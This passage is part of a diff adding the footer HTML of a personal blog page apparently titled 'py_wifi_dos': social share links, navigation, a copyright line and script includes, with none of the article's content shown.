+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/01/04/py-wifi-dos/&is_video=false&description=py_wifi_dos"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=py_wifi_dos&body=Check out this article: http://yoursite.com/2019/01/04/py-wifi-dos/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/01/04/py-wifi-dos/&title=py_wifi_dos"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/01/04/py-wifi-dos/&title=py_wifi_dos"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/01/04/py-wifi-dos/&title=py_wifi_dos"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/01/04/py-wifi-dos/&title=py_wifi_dos"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/01/04/py-wifi-dos/&name=py_wifi_dos&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projectes</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
